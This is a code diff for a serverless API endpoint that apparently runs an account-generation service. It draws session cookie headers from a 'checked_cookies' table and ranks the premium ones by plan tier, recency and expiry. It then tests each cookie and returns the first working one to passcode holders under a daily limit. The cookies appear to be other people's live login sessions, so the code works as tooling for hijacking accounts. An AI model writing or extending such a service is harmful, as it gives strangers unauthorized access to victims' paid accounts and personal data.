@@ -19,7 +19,7 @@ function getClientIp(req: VercelRequest) {
 }
 
 const GENERATE_ACCOUNT_DAILY_LIMIT = 3;
-
+const PREMIUM_POOL_FETCH_LIMIT = 200;
 
 function getTodayDate() {
   return new Date().toISOString().slice(0, 10);
@@ -90,7 +90,6 @@ async function getDailyGenerateUsage(ip: string) {
     .maybeSingle();
 
   if (error) throw new Error(error.message);
-
   return data?.count ?? 0;
 }
 
@@ -116,7 +115,6 @@ async function incrementDailyGenerateUsage(ip: string) {
     .eq("date", today);
 
   if (error) throw new Error(error.message);
-
   return current + 1;
 }
 
@@ -137,12 +135,89 @@ async function savePassedCheckAudits(results: any[]) {
   }
 }
 
+function shuffleArray<T>(items: T[]) {
+  const copy = [...items];
+  for (let i = copy.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [copy[i], copy[j]] = [copy[j], copy[i]];
+  }
+  return copy;
+}
+
+function scorePremiumCookie(row: any) {
+  let score = 0;
+
+  const plan = String(row?.plan || "").toLowerCase();
+  if (plan.includes("premium")) score += 6;
+  if (plan.includes("ultra")) score += 7;
+  if (plan.includes("standard")) score += 3;
+
+  if (row?.checked_at) {
+    const checkedAt = new Date(row.checked_at).getTime();
+    if (!Number.isNaN(checkedAt)) {
+      const ageMs = Date.now() - checkedAt;
+      const ageDays = ageMs / (1000 * 60 * 60 * 24);
+
+      if (ageDays <= 1) score += 6;
+      else if (ageDays <= 3) score += 5;
+      else if (ageDays <= 7) score += 4;
+      else if (ageDays <= 14) score += 2;
+      else score += 1;
+    }
+  }
+
+  if (row?.expires_at) {
+    const expiresAt = new Date(row.expires_at).getTime();
+    if (!Number.isNaN(expiresAt)) {
+      const diffDays = (expiresAt - Date.now()) / (1000 * 60 * 60 * 24);
+
+      if (diffDays > 30) score += 6;
+      else if (diffDays > 14) score += 5;
+      else if (diffDays > 7) score += 4;
+      else if (diffDays > 2) score += 2;
+      else if (diffDays > 0) score += 1;
+      else score -= 5;
+    }
+  }
+
+  return score;
+}
+
+async function getPremiumCookiePool() {
+  const { data, error } = await supabase
+    .from("checked_cookies")
+    .select("cookie_header, plan, checked_at, expires_at")
+    .ilike("plan", "%premium%")
+    .not("cookie_header", "is", null)
+    .order("checked_at", { ascending: false })
+    .limit(PREMIUM_POOL_FETCH_LIMIT);
+
+  if (error) throw new Error(error.message);
+
+  const rows = (data ?? []).filter((row: any) => !!row?.cookie_header);
+
+  if (!rows.length) {
+    return [];
+  }
+
+  const strongRows = rows
+    .map((row: any) => ({
+      ...row,
+      __score: scorePremiumCookie(row),
+    }))
+    .sort((a: any, b: any) => b.__score - a.__score);
+
+  const topStrong = strongRows.slice(0, 60);
+  const rest = strongRows.slice(60);
+
+  return [...shuffleArray(topStrong), ...shuffleArray(rest)];
+}
+
 export default async function handler(req: VercelRequest, res: VercelResponse) {
   try {
     const ip = getClientIp(req);
 
     const { success } = await ipRateLimit.limit(ip);
-
     if (!success) {
       return res.status(429).json({
         success: false,
@@ -151,15 +226,12 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     }
 
     const locked = await isLockedOut(ip);
-
     if (locked) {
       return res.status(429).json({
         success: false,
         error: "Too many failed attempts. Try again later.",
       });
     }
-
-    console.log("find-account method:", req.method);
 
     if (req.method !== "POST") {
       return res.status(405).json({
@@ -169,8 +241,6 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     }
 
     const passcode = String(req.body?.passcode ?? "").trim();
-    console.log("find-account passcode present:", !!passcode);
-
     if (!passcode) {
       return res.status(400).json({
         success: false,
@@ -179,10 +249,8 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     }
 
     const passcodeCheck = await isPasscodeValid(passcode);
-
     if (!passcodeCheck.ok) {
       await recordFailure(ip);
-
       return res.status(401).json({
         success: false,
         error: passcodeCheck.error,
@@ -198,44 +266,36 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
 
     const isAdmin = passcodeCheck.passcodeRow.is_admin === true;
 
-if (!isAdmin) {
-  const todayUsage = await getDailyGenerateUsage(ip);
+    if (!isAdmin) {
+      const todayUsage = await getDailyGenerateUsage(ip);
 
-  if (todayUsage >= GENERATE_ACCOUNT_DAILY_LIMIT) {
-    return res.status(429).json({
-      success: false,
-      error: "You have reached the 3 daily limit for Generate Account. Try again tomorrow.",
-    });
-  }
+      if (todayUsage >= GENERATE_ACCOUNT_DAILY_LIMIT) {
+        return res.status(429).json({
+          success: false,
+          error: "You have reached the 3 daily limit for Generate Account. Try again tomorrow.",
+        });
+      }
 
-  await incrementDailyGenerateUsage(ip);
-}
+      await incrementDailyGenerateUsage(ip);
+    }
 
-    const { data: cookieRows, error: cookieError } = await supabase
-      .from("cookies")
-      .select("cookie")
-      .order("created_at", { ascending: false });
+    const premiumPoolRows = await getPremiumCookiePool();
 
-    console.log("cookie query error:", cookieError);
-    console.log("cookie row count:", cookieRows?.length ?? 0);
-
-    if (cookieError) {
-      return res.status(500).json({
+    if (!premiumPoolRows.length) {
+      return res.status(400).json({
         success: false,
-        error: cookieError.message,
+        error: "Premium cookie pool is empty. No premium cookies available yet.",
       });
     }
 
-    const storedCookies = (cookieRows ?? [])
-      .map((row: any) => row.cookie)
+    const storedCookies = premiumPoolRows
+      .map((row: any) => row.cookie_header)
       .filter(Boolean);
-
-    console.log("storedCookies count:", storedCookies.length);
 
     if (!storedCookies.length) {
       return res.status(400).json({
         success: false,
-        error: "Cookie pool is empty. No cookies available yet.",
+        error: "No valid premium cookies found in checked_cookies.",
       });
     }
 
@@ -243,13 +303,7 @@ if (!isAdmin) {
       input: storedCookies.join("\n"),
     });
 
-    console.log("parsedInput error:", parsedInput?.error ?? null);
-    console.log(
-      "parsed cookie count:",
-      Array.isArray(parsedInput?.cookies) ? parsedInput.cookies.length : 0
-    );
-
-    if (parsedInput.error) {
+    if (parsedInput?.error) {
       return res.status(400).json({
         success: false,
         error: parsedInput.error,
@@ -260,16 +314,12 @@ if (!isAdmin) {
     if (!Array.isArray(cookies) || !cookies.length) {
       return res.status(400).json({
         success: false,
-        error: "No valid cookies found in the pool.",
+        error: "No valid premium cookies found in the pool.",
       });
     }
 
-    for (let i = cookies.length - 1; i > 0; i--) {
-      const j = Math.floor(Math.random() * (i + 1));
-      [cookies[i], cookies[j]] = [cookies[j], cookies[i]];
-    }
-
-    console.log("starting scan:", cookies.length);
+    console.log("premium pool size:", cookies.length);
+    console.log("starting premium scan");
 
     for (const cookie of cookies) {
       const result = await runDirectCheck([cookie], 1, {
@@ -281,20 +331,18 @@ if (!isAdmin) {
       });
 
       const results = Array.isArray(result?.results) ? result.results : [];
-
       await savePassedCheckAudits(results);
 
       const valid = results.find((r: any) => r?.valid);
-
       if (valid) {
-        console.log("valid cookie found");
+        console.log("valid premium cookie found");
         return res.status(200).json(result);
       }
     }
 
     return res.status(200).json({
       success: false,
-      error: "No valid account found from available cookies.",
+      error: "No valid premium account found from checked premium cookies.",
     });
   } catch (error: any) {
     console.error("find-account crash:", error);
